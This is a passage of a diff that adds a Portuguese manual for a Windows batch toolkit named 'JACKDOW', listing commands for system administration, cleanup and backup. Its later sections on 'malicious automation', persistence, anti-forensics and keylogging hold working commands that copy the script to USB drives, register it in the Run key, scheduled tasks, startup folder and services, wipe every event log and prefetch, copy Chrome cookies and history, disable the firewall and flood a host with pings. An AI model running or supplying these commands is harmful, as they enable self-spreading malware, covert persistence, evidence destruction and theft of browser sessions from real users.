+Descrição: Importa arquivo .reg.
+
+25.6. Compactar registro
+-------------------------
+Comando: reg save HKLM\System system.hiv & reg save HKLM\Software software.hiv
+Descrição: Salva hives em formato compactado.
+
+25.7. Permissões segurança
+---------------------------
+Comando: reg query "HKLM\SAM" /reg:32
+Descrição: Tenta acessar hive SAM (requer SYSTEM).
+
+25.8. Exportar suporte
+-----------------------
+Comando: reg export HKLM suporte_%data%.reg
+Descrição: Exporta HKLM para análise de suporte.
+
+=====================================================================
+
+24. MONITORAMENTO DE REDE (26)
+===============================
+
+26.1. Conexões tempo real
+--------------------------
+Comando: loop com netstat -an | findstr ESTABLISHED a cada 5s
+Descrição: Monitora conexões estabelecidas em tempo real.
+
+26.2. Teste velocidade
+-----------------------
+Comando: ping -n 10 -l 1024 %host%
+Descrição: Testa latência com pacotes grandes.
+
+26.3. Monitor banda
+--------------------
+Comando: typeperf "\Network Interface(*)\Bytes Total/sec" -sc 10
+Descrição: Monitora uso de banda da interface.
+
+26.4. Escanear portas
+----------------------
+Comando: for /l %%i in (1,1,1024) do (powershell Test-NetConnection localhost -Port %%i | find "TcpTestSucceeded" && echo Porta %%i aberta)
+Descrição: Escaneia portas 1-1024 no localhost.
+
+26.5. Verificar DNS
+--------------------
+Comando: nslookup google.com & ipconfig /displaydns | findstr "Registro"
+Descrição: Verifica resolução DNS e cache.
+
+26.6. Resetar rede
+-------------------
+Comando: netsh int ip reset & netsh winsock reset & ipconfig /release & ipconfig /renew
+Descrição: Reseta completamente configuração de rede.
+
+26.7. Conexões estrangeiras
+----------------------------
+Comando: netstat -an | findstr ESTABLISHED | findstr /v "127.0.0.1" | findstr /v "192.168" | findstr /v "10."
+Descrição: Conexões para IPs não locais.
+
+26.8. Bloquear IP
+------------------
+Comando: netsh advfirewall firewall add rule name="Bloqueado" dir=in action=block remoteip=%ip%
+Descrição: Adiciona regra de firewall bloqueando IP.
+
+=====================================================================
+
+25. SERVIÇOS AVANÇADO (27)
+===========================
+
+27.1. Gerenciar serviços
+-------------------------
+Comando: net start/stop %servico% & sc config %servico% start= disabled
+Descrição: Menu interativo para gerenciar serviços.
+
+27.2. Listar por estado
+------------------------
+Comando: sc query state= active/inactive
+Descrição: Lista serviços ativos ou inativos.
+
+27.3. Serviços terceiros
+-------------------------
+Comando: sc query type= service | findstr /i "SERVICE_NAME" | findstr /v "Microsoft"
+Descrição: Serviços não Microsoft.
+
+27.4. Serviços parados úteis
+-----------------------------
+Comando: sc query state= inactive | findstr "SERVICE_NAME"
+Descrição: Lista serviços parados.
+
+27.5. Serviços desnecessários
+------------------------------
+Comando: sc query type= service | findstr /i "XblAuth XblGameSave XboxNetApiSvc lfsvc"
+Descrição: Serviços que podem ser desativados.
+
+27.6. Processos por usuário
+----------------------------
+Comando: tasklist /v | findstr "Console"
+Descrição: Processos do usuário atual.
+
+27.7. Consumo por serviço
+--------------------------
+Comando: typeperf "\Process(*)\% Tempo do Processador" -sc 5
+Descrição: Monitora CPU por processo.
+
+27.8. Exportar lista
+---------------------
+Comando: sc query type= service > servicos.txt
+Descrição: Exporta lista de serviços para arquivo.
+
+=====================================================================
+
+26. LOGS E AUDITORIA (28)
+==========================
+
+28.1. Limpar logs sistema
+--------------------------
+Comando: for /f %%a in ('wevtutil el') do wevtutil cl "%%a" 2>nul
+Descrição: Limpa todos os logs de eventos.
+
+28.2. Logs erro críticos
+-------------------------
+Comando: wevtutil qe System /c:50 /f:text /e:true | findstr "erro error critical"
+Descrição: Exibe erros críticos.
+
+28.3. Auditoria básica
+-----------------------
+Comando: auditpol /get /category:* | findstr "Sucesso Falha"
+Descrição: Configurações de auditoria.
+
+28.4. Logs segurança
+---------------------
+Comando: wevtutil qe Security /c:20 /f:text /e:true | findstr "4625 4634"
+Descrição: Tentativas de login falhas (4625) e logoffs.
+
+28.5. Relatório estabilidade
+-----------------------------
+Comando: perfmon /rel
+Descrição: Abre monitor de confiabilidade.
+
+28.6. Logs instalação
+----------------------
+Comando: dir C:\Windows\Inf\*.log
+Descrição: Logs de instalação de drivers.
+
+28.7. Backup logs
+------------------
+Comando: wevtutil epl System system_backup.evtx & wevtutil epl Application app_backup.evtx
+Descrição: Exporta logs principais.
+
+28.8. Monitor mudanças
+-----------------------
+Comando: Monitoramento do arquivo hosts
+Descrição: Avisa sobre mudanças (simulado).
+
+=====================================================================
+
+27. DRIVERS E HARDWARE (29)
+============================
+
+29.1. Verificar integridade
+----------------------------
+Comando: driverquery /si
+Descrição: Status dos drivers.
+
+29.2. Drivers desatualizados
+-----------------------------
+Comando: driverquery /v /fo list | findstr /i "date"
+Descrição: Verifica datas dos drivers.
+
+29.3. Backup drivers
+---------------------
+Comando: dism /online /export-driver /destination:C:\DriversBackup
+Descrição: Exporta todos os drivers.
+
+29.4. Restaurar drivers
+------------------------
+Comando: dism /online /add-driver /driver:%origem% /recurse
+Descrição: Restaura drivers de backup.
+
+29.5. Dispositivos com problema
+--------------------------------
+Comando: wmic path win32_pnpentity get name,status | findstr "Error"
+Descrição: Dispositivos com erro.
+
+29.6. Hardware oculto
+----------------------
+Comando: devcon find * (requer Windows SDK)
+Descrição: Mostra hardware oculto.
+
+29.7. Temperatura
+------------------
+Comando: powershell "Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace root/wmi | Select CurrentTemperature"
+Descrição: Temperatura dos componentes (se disponível).
+
+29.8. Teste estabilidade
+-------------------------
+Comando: Loop CPU e verificação de memória
+Descrição: Teste básico de estabilidade.
+
+=====================================================================
+
+28. USUÁRIOS AVANÇADO (30)
+===========================
+
+30.1. Criar admin temporário
+-----------------------------
+Comando: net user %user% * /add & net localgroup administradores %user% /add
+Descrição: Cria usuário com privilégios admin.
+
+30.2. Usuários ativos
+----------------------
+Comando: query user
+Descrição: Usuários logados no momento.
+
+30.3. Último logon
+-------------------
+Comando: wmic useraccount get name,lastlogon
+Descrição: Data do último logon.
+
+30.4. Permissões compartilhadas
+--------------------------------
+Comando: net share
+Descrição: Pastas compartilhadas.
+
+30.5. Bloquear usuário
+-----------------------
+Comando: net user %user% /active:no
+Descrição: Desativa conta.
+
+30.6. Auditoria admins
+-----------------------
+Comando: net localgroup administradores & wevtutil qe Security /c:20 | findstr "4732 4733"
+Descrição: Membros do grupo admin e mudanças.
+
+30.7. Senhas expiradas
+-----------------------
+Comando: wmic useraccount where "Disabled=FALSE" get name,passwordexpires
+Descrição: Usuários com senha a expirar.
+
+30.8. Sessões remotas
+----------------------
+Comando: net session
+Descrição: Sessões abertas via rede.
+
+=====================================================================
+
+29. BACKUP AVANÇADO (31)
+=========================
+
+31.1. Backup sistema completo
+------------------------------
+Comando: Backup combinado: registro + perfil + drivers
+Descrição: Backup completo em pasta datada.
+
+31.2. Ponto restauração
+------------------------
+Comando: wmic syscreate restorepoint
+Descrição: Cria ponto de restauração.
+
+31.3. Backup perfil
+--------------------
+Comando: robocopy C:\Users\%username% C:\UserBackup /MIR
+Descrição: Backup completo do perfil do usuário.
+
+31.4. Restaurar deletados
+--------------------------
+Descrição: Placeholder para ferramentas de recuperação.
+
+31.5. Backup favoritos
+-----------------------
+Comando: copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" bookmarks.bak
+Descrição: Backup dos favoritos do Chrome/Edge.
+
+31.6. Backup certificados
+--------------------------
+Comando: certutil -exportPFX -p senha123 My
+Descrição: Exporta certificados.
+
+31.7. Backup variáveis
+-----------------------
+Comando: set > env_backup.txt
+Descrição: Salva variáveis de ambiente.
+
+31.8. Restauração emergencial
+------------------------------
+Descrição: Script de recuperação (simulado).
+
+=====================================================================
+
+30. RELATÓRIOS (32)
+====================
+
+32.1. Relatório suporte
+------------------------
+Comandos:
+- systeminfo
+- ipconfig /all
+- tasklist
+- driverquery
+- wmic product
+- netstat
+Descrição: Relatório completo para suporte técnico.
+
+32.2. Relatório hardware
+-------------------------
+Comando: systeminfo + wmic cpu + wmic memorychip
+Descrição: Especificações de hardware.
+
+32.3. Relatório software
+-------------------------
+Comando: wmic product get name,version
+Descrição: Lista de software instalado.
+
+32.4. Relatório rede
+---------------------
+Comando: ipconfig /all + netstat -an + route print
+Descrição: Configuração completa de rede.
+
+32.5. Relatório segurança
+--------------------------
+Comando: Defender status + firewall + updates
+Descrição: Status de segurança.
+
+32.6. Relatório desempenho
+---------------------------
+Comando: winsat formal
+Descrição: Benchmarks do sistema.
+
+32.7. Relatório comparativo
+----------------------------
+Descrição: Comparação antes/depois (manual).
+
+32.8. Exportar HTML
+--------------------
+Comando: powershell "Get-Process | ConvertTo-HTML > processos.html"
+Descrição: Exporta em formato HTML.
+
+=====================================================================
+
+31. LIMPEZA AVANÇADA (33)
+==========================
+
+33.1. Limpeza logs
+-------------------
+Comando: for /f %%a in ('wevtutil el') do wevtutil cl "%%a"
+Descrição: Limpa todos os logs de eventos.
+
+33.2. Cache navegadores
+------------------------
+Comando: del /f /s /q "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Cache\*"
+Descrição: Limpa cache Chrome, Edge, Firefox.
+
+33.3. Prefetch
+---------------
+Comando: del /f /s /q C:\Windows\Prefetch\*
+Descrição: Limpa arquivos Prefetch.
+
+33.4. Cache DNS
+----------------
+Comando: ipconfig /flushdns
+Descrição: Limpa cache DNS.
+
+33.5. Cache fontes
+-------------------
+Comando: del /f /s /q C:\Windows\System32\FNTCACHE.DAT
+Descrição: Remove cache de fontes.
+
+33.6. Thumbnails
+-----------------
+Comando: del /f /s /q "%USERPROFILE%\AppData\Local\Microsoft\Windows\Explorer\thumbcache_*.db"
+Descrição: Limpa cache de miniaturas.
+
+33.7. Crash dumps
+------------------
+Comando: del /f /s /q C:\Windows\Minidump\* & del /f /s /q C:\Windows\memory.dmp
+Descrição: Remove arquivos de dump de memória.
+
+33.8. Instaladores
+-------------------
+Comando: del /f /s /q C:\Windows\Installer\$PatchCache$
+Descrição: Remove cache de patches.
+
+=====================================================================
+
+32. INTERFACE (34)
+===================
+
+34.1. Modo escuro
+------------------
+Comando: color 0F
+Descrição: Altera cores do terminal (fundo preto, texto branco).
+
+34.2. Salvar logs
+------------------
+Comando: mkdir C:\JACKDOW_LOGS
+Descrição: Cria pasta para logs.
+
+34.3. Agendar tarefas
+----------------------
+Comando: schtasks /create /tn "JACKDOW" /tr "%~dp0jackdow.bat" /sc daily /st 10:00
+Descrição: Agenda execução diária.
+
+34.4. Atalhos teclado
+----------------------
+Descrição: Ctrl+L limpa tela (info apenas).
+
+34.5. Modo silencioso
+----------------------
+Descrição: Executa sem pausas (simulado).
+
+34.6. Exportar config
+----------------------
+Comando: echo Config > config.ini
+Descrição: Salva configurações.
+
+34.7. Múltiplos perfis
+-----------------------
+Descrição: Seleção de perfil (simulado).
+
+34.8. Menu contexto
+--------------------
+Comando: reg add "HKCR\Directory\shell\JACKDOW" /ve /d "JACKDOW Toolkit" /f
+Descrição: Adiciona atalho ao menu de contexto do Explorer.
+
+=====================================================================
+
+33. HACKING E PENTEST (35)
+===========================
+
+35.1. Scanner de portas rápido
+-------------------------------
+Comando: for /l %%i in (1,1,1024) do (ping -n 1 -w 10 localhost | find "TTL" >nul && echo Porta interna %%i)
+Descrição: Scanner básico de portas (localhost).
+
+35.2. Força bruta básica
+-------------------------
+Descrição: Simulação de força bruta SSH (conceitual).
+
+35.3. Sniffer de rede
+----------------------
+Comando: netstat -e
+Descrição: Estatísticas de rede (sniffer simulado).
+
+35.4. ARP spoof simulado
+-------------------------
+Descrição: Conceito de ARP spoofing.
+
+35.5. DNS spoof simulado
+-------------------------
+Descrição: Conceito de DNS spoofing.
+
+35.6. Session hijack simulado
+------------------------------
+Descrição: Conceito de hijacking.
+
+35.7. Crack de hash básico
+---------------------------
+Comando: certutil -hashfile %0 MD5
+Descrição: Gera hash MD5 do próprio arquivo.
+
+35.8. SQL injection test
+-------------------------
+Descrição: Teste conceitual SQLi.
+
+35.9. XSS test
+---------------
+Descrição: Teste conceitual XSS.
+
+=====================================================================
+
+34. ESTEGANOGRAFIA (36)
+========================
+
+36.1. Ocultar em imagem
+------------------------
+Comando: copy /b imagem.jpg + arquivo.rar imagem_oculta.jpg
+Descrição: Esconde arquivo dentro de imagem (concatenação).
+
+36.2. Extrair de imagem
+------------------------
+Descrição: Extração manual (uso de ferramentas).
+
+36.3. Ocultar em áudio
+-----------------------
+Descrição: Conceitual.
+
+36.4. Extrair de áudio
+-----------------------
+Descrição: Conceitual.
+
+36.5. Ocultar em texto
+-----------------------
+Descrição: Conceitual.
+
+36.6. Extrair de texto
+-----------------------
+Comando: findstr "JACKDOW" %0
+Descrição: Busca string em arquivo.
+
+36.7. Arquivo dentro de arquivo
+--------------------------------
+Comando: copy /b imagem.jpg + arquivo.rar imagem_oculta.jpg
+Descrição: Combina arquivos.
+
+36.8. Assinatura digital falsa
+-------------------------------
+Descrição: Conceitual.
+
+=====================================================================
+
+35. ENGENHARIA REVERSA (37)
+============================
+
+37.1. Analisar PE header
+-------------------------
+Comando: powershell "Get-Content '%arquivo%' -Encoding Byte -TotalCount 64 | Format-Hex"
+Descrição: Hex dump do cabeçalho.
+
+37.2. Listar importações
+-------------------------
+Comando: dumpbin /imports %arquivo% (requer VS)
+Descrição: DLLs importadas.
+
+37.3. Listar exportações
+-------------------------
+Comando: dumpbin /exports %arquivo% (requer VS)
+Descrição: Funções exportadas.
+
+37.4. Disassembler básico
+--------------------------
+Descrição: Conceitual.
+
+37.5. Strings de binário
+-------------------------
+Comando: findstr /i "http https ftp" %arquivo%
+Descrição: Busca strings em binário.
+
+37.6. Hex dump
+---------------
+Comando: certutil -encodehex %arquivo% hex.txt
+Descrição: Gera hex dump do arquivo.
+
+37.7. Comparar binários
+------------------------
+Comando: fc /b %arquivo1% %arquivo2%
+Descrição: Comparação binária.
+
+37.8. Packer detection
+-----------------------
+Descrição: Detecção conceitual.
+
+=====================================================================
+
+36. AUTOMAÇÃO MALICIOSA (38)
+=============================
+
+38.1. Auto execução agendada
+-----------------------------
+Comando: schtasks /create /tn "Updater" /tr "%~dp0%0" /sc hourly /f
+Descrição: Agenda execução do próprio script.
+
+38.2. Propagação USB
+---------------------
+Comando: for %%a in (D E F G) do if exist %%a:\ copy %0 %%a:\auto.bat
+Descrição: Copia script para drives USB.
+
+38.3. Coleta automática
+------------------------
+Comando: dir /s C:\Users\*.docx > coletados.txt
+Descrição: Coleta documentos.
+
+38.4. Envio de dados
+---------------------
+Descrição: Envio via HTTP (conceitual).
+
+38.5. Evasão de AV
+-------------------
+Descrição: Técnicas conceituais.
+
+38.6. Polimorfismo básico
+--------------------------
+Descrição: Criação de variantes.
+
+38.7. Mutação de código
+------------------------
+Comando: copy %0 %random%.bat
+Descrição: Cria cópia com nome aleatório.
+
+38.8. Teste de sandbox
+-----------------------
+Descrição: Detecção de ambiente virtual.
+
+=====================================================================
+
+37. KEYLOGGING (39)
+====================
+
+39.1. Iniciar keylogger básico
+-------------------------------
+Descrição: Não implementado por questões éticas.
+
+39.2. Parar keylogger
+----------------------
+Comando: taskkill /f /im keylogger.exe
+Descrição: Mata processo.
+
+39.3. Capturar clipboard
+-------------------------
+Comando: powershell "Get-Clipboard"
+Descrição: Exibe conteúdo da área de transferência.
+
+39.4. Capturar tela
+--------------------
+Descrição: Conceitual.
+
+39.5. Capturar senhas
+----------------------
+Descrição: Conceitual.
+
+39.6. Capturar cookies
+-----------------------
+Comando: copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Cookies" cookies.txt
+Descrição: Copia cookies do Chrome.
+
+39.7. Capturar histórico
+-------------------------
+Comando: copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\History" history.txt
+Descrição: Copia histórico do Chrome.
+
+39.8. Enviar logs
+------------------
+Descrição: Conceitual.
+
+=====================================================================
+
+38. PERSISTÊNCIA (40)
+======================
+
+40.1. Registro Run
+-------------------
+Comando: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "%~dp0%0" /f
+Descrição: Adiciona ao registro para execução automática.
+
+40.2. Agendador tarefas
+------------------------
+Comando: schtasks /create /tn "Persist" /tr "%~dp0%0" /sc onlogon /f
+Descrição: Agenda execução no logon.
+
+40.3. Pasta startup
+--------------------
+Comando: copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+Descrição: Copia para pasta de inicialização.
+
+40.4. Serviço persistente
+--------------------------
+Comando: sc create Persist binPath= "%~dp0%0" start= auto
+Descrição: Cria serviço.
+
+40.5. WMI persistence
+----------------------
+Comando: wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="Persistence"
+Descrição: Persistência via WMI.
+
+40.6. DLL hijacking simulado
+-----------------------------
+Descrição: Conceitual.
+
+40.7. Boot persistence
+-----------------------
+Comando: bcdedit /enum
+Descrição: Verifica configurações de boot.
+
+40.8. Image hijacking
+----------------------
+Descrição: Conceitual.
+
+=====================================================================
+
+39. ANTI-FORENSE (41)
+======================
+
+41.1. Limpar logs eventos
+--------------------------
+Comando: for /f %%a in ('wevtutil el') do wevtutil cl "%%a"
+Descrição: Apaga todos os logs.
+
+41.2. Limpar prefetch
+----------------------
+Comando: del /f /s /q C:\Windows\Prefetch\*
+Descrição: Remove evidências de execução.
+
+41.3. Limpar recent files
+--------------------------
+Comando: del /f /s /q "%USERPROFILE%\Recent\*"
+Descrição: Remove arquivos recentes.
+
+41.4. Limpar jump lists
+------------------------
+Comando: del /f /s /q "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\*"
+Descrição: Remove jump lists.
+
+41.5. Limpar USN journal
+-------------------------
+Descrição: Requer ferramentas especiais.
+
+41.6. Limpar $MFT
+------------------
+Descrição: Requer ferramentas especiais.
+
+41.7. Sobrescrever espaço livre
+--------------------------------
+Comando: cipher /w:C
+Descrição: Sobrescreve espaço livre.
+
+41.8. Timestomping
+-------------------
+Comando: copy %0 %0.tmp (altera timestamp)
+Descrição: Modifica timestamps.
+
+=====================================================================
+
+40. EXPLOITS (42)
+==================
+
+42.1. Verificar vulnerabilidades
+---------------------------------
+Descrição: Scanner genérico.
+
+42.2. EternalBlue check
+------------------------
+Comando: systeminfo | find "KB4012212" || echo Vulneravel
+Descrição: Verifica patch MS17-010.
+
+42.3. BlueKeep check
+---------------------
+Comando: systeminfo | find "KB4499175" || echo Vulneravel
+Descrição: Verifica patch CVE-2019-0708.
+
+42.4. PrintNightmare check
+---------------------------
+Comando: sc query spooler | find "RUNNING" && echo Spooler ativo
+Descrição: Verifica se spooler está ativo.
+
+42.5. Zerologon check
+----------------------
+Descrição: Check conceitual.
+
+42.6. SMBGhost check
+---------------------
+Comando: sc query srv2 | find "RUNNING" && echo SMB ativo
+Descrição: Verifica SMB.
+
+42.7. MS17-010 check
+---------------------
+Comando: systeminfo | find "KB4012212" || echo Vulneravel
+Descrição: Check específico.
+
+42.8. Metasploit payload
+-------------------------
+Descrição: Geração conceitual.
+
+=====================================================================
+
+41. CRIPTOGRAFIA FORÇADA (43)
+===============================
+
+43.1. Gerar chave RSA
+----------------------
+Descrição: Conceitual.
+
+43.2. Criptografar arquivo
+---------------------------
+Comando: cipher /e %arquivo%
+Descrição: Criptografia EFS.
+
+43.3. Descriptografar arquivo
+------------------------------
+Comando: cipher /d %arquivo%
+Descrição: Descriptografia EFS.
+
+43.4. Força bruta hash
+-----------------------
+Comando: certutil -hashfile %0 MD5
+Descrição: Gera hash para teste.
+
+43.5. Rainbow table sim
+------------------------
+Descrição: Conceitual.
+
+43.6. Criptoanalise básica
+---------------------------
+Descrição: Conceitual.
+
+43.7. Assinar arquivo
+----------------------
+Comando: certutil -hashfile %arquivo% SHA256 > assinatura.txt
+Descrição: Gera assinatura hash.
+
+43.8. Verificar assinatura
+---------------------------
+Comando: certutil -verify %1
+Descrição: Verifica certificado.
+
+=====================================================================
+
+42. REDES ANÔNIMAS (44)
+========================
+
+44.1. Verificar IP público
+---------------------------
+Comando: curl ifconfig.me 2>nul || powershell "(Invoke-WebRequest ifconfig.me).Content"
+Descrição: Mostra IP externo.
+
+44.2. Testar proxy
+-------------------
+Comando: netsh winhttp set proxy %proxy%
+Descrição: Configura proxy.
+
+44.3. Tor check
+----------------
+Comando: ping -n 1 check.torproject.org | find "TTL" || echo Tor nao detectado
+Descrição: Verifica Tor.
+
+44.4. VPN check
+----------------
+Comando: nslookup myip.opendns.com resolver1.opendns.com
+Descrição: Verifica IP via DNS.
+
+44.5. Limpar rastros navegação
+-------------------------------
+Comando: del /f /s /q "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Cache\*"
+Descrição: Limpa cache.
+
+44.6. DNS anônimo
+------------------
+Comando: netsh dns add 1.1.1.1
+Descrição: Configura DNS Cloudflare.
+
+44.7. MAC spoof simulado
+-------------------------
+Descrição: Conceitual.
+
+44.8. Geolocation spoof
+------------------------
+Descrição: Conceitual.
+
+=====================================================================
+
+43. INJEÇÃO DE PROCESSOS (45)
+==============================
+
+45.1. DLL injection simulado
+-----------------------------
+Descrição: Conceitual.
+
+45.2. Process hollowing simulado
+---------------------------------
+Descrição: Conceitual.
+
+45.3. APC injection simulado
+-----------------------------
+Descrição: Conceitual.
+
+45.4. Thread hijacking simulado
+--------------------------------
+Descrição: Conceitual.
+
+45.5. Reflective DLL simulado
+------------------------------
+Descrição: Conceitual.
+
+45.6. PE injection simulado
+----------------------------
+Descrição: Conceitual.
+
+45.7. Code cave simulado
+-------------------------
+Descrição: Conceitual.
+
+45.8. RunPE simulado
+---------------------
+Descrição: Conceitual.
+
+=====================================================================
+
+44. BYPASS DE SEGURANÇA (46)
+=============================
+
+46.1. Bypass UAC simulado
+--------------------------
+Descrição: Conceitual.
+
+46.2. Bypass AppLocker simulado
+--------------------------------
+Descrição: Conceitual.
+
+46.3. Bypass Defender simulado
+-------------------------------
+Descrição: Conceitual.
+
+46.4. Bypass firewall simulado
+-------------------------------
+Comando: netsh advfirewall set allprofiles state off
+Descrição: Desativa firewall.
+
+46.5. Bypass antivirus simulado
+--------------------------------
+Descrição: Conceitual.
+
+46.6. Bypass DEP simulado
+--------------------------
+Descrição: Conceitual.
+
+46.7. Bypass ASLR simulado
+---------------------------
+Descrição: Conceitual.
+
+46.8. Bypass sandbox simulado
+------------------------------
+Descrição: Conceitual.
+
+=====================================================================
+
+45. COLETA DE INTELLIGENCE (47)
+================================
+
+47.1. Coleta de informações
+----------------------------
+Comando: systeminfo & ipconfig /all & net user & net localgroup
+Descrição: Coleta informações do sistema.
+
+47.2. OSINT básico
+-------------------
+Descrição: Conceitual.
+
+47.3. Whois domain
+-------------------
+Comando: whois %dominio%
+Descrição: Consulta WHOIS.
+
+47.4. DNS recon
+----------------
+Comando: nslookup %dominio%
+Descrição: Consulta DNS.
+
+47.5. Subdomain enum
+---------------------
+Comando: nslookup -type=any %dominio%
+Descrição: Enumeração de subdomínios.
+
+47.6. Email harvest
+--------------------
+Descrição: Conceitual.
+
+47.7. Metadata extraction
+--------------------------
+Comando: powershell "Get-ItemProperty %arquivo%"
+Descrição: Extrai metadados.
+
+47.8. Social media recon
+-------------------------
+Descrição: Conceitual.
+
+=====================================================================
+
+46. MANIPULAÇÃO DE MEMÓRIA (48)
+================================
+
+48.1. Dump memória
+-------------------
+Descrição: Requer ferramentas especiais.
+
+48.2. Analisar heap
+--------------------
+Descrição: Conceitual.
+
+48.3. Analisar stack
+---------------------
+Descrição: Conceitual.
+
+48.4. Ver permissões memória
+-----------------------------
+Comando: dumpbin /headers %0
+Descrição: Ver cabeçalho PE.
+
+48.5. Injetar shellcode simulado
+---------------------------------
+Descrição: Conceitual.
+
+48.6. Buffer overflow simulado
+-------------------------------
+Descrição: Conceitual.
+
+48.7. ROP chain simulado
+-------------------------
+Descrição: Conceitual.
+
+48.8. Memory scanning
+----------------------
+Descrição: Conceitual.
+
+=====================================================================
+
+47. ATAQUES DE REDE (49)
+=========================
+
+49.1. SYN flood simulado
+-------------------------
+Descrição: Requer ferramentas especiais.
+
+49.2. UDP flood simulado
+-------------------------
+Descrição: Requer ferramentas especiais.
+
+49.3. ICMP flood simulado
+--------------------------
+Comando: ping -n 100 -l 65500 %ip%
+Descrição: Flood de ping (limitado).
+
+49.4. HTTP flood simulado
+--------------------------
+Descrição: Conceitual.
+
+49.5. Slowloris simulado
+-------------------------
+Descrição: Conceitual.
+
+49.6. DNS amplification simulado
+---------------------------------
+Descrição: Conceitual.
+
+49.7. NTP amplification simulado
+---------------------------------
+Descrição: Conceitual.
+
+49.8. Deauth attack simulado
+-----------------------------
+Descrição: Conceitual.
+
+=====================================================================
+
+48. BACKUP COMPLETO (Função Auxiliar)
+======================================
+
+Função: backup_completo
+------------------------
+Comandos:
+- reg export HKLM C:\Backup\HKLM.reg
+- reg export HKCU C:\Backup\HKCU.reg
+- reg export HKCR C:\Backup\HKCR.reg
+- robocopy C:\Users\%username% C:\Backup\Perfil /MIR
+- dism /online /export-driver /destination:C:\Backup\Drivers
+Descrição: Executa backup completo do registro, perfil e drivers em pasta datada.
+
+=====================================================================
+
+NOTAS FINAIS
+=============
+
+1. Privilégios: Muitas funções requerem execução como Administrador.
+2. Simulações: Funções de hacking são conceituais/simuladas.
+3. Dependências: Ocasionalmente, ferramentas como dumpbin (Visual Studio) são necessárias.
+4. Segurança: Use apenas em sistemas próprios ou com autorização.
+5. Compatibilidade: Windows 98-11, mas algumas funções podem não estar disponíveis em versões antigas.
+6. Limitações: O CMD tem limitações; funções complexas são simplificadas.
+7. Atualizações: Verifique periodicamente por novas versões.
+
+=====================================================================
+FIM DO MANUAL
+=====================================================================
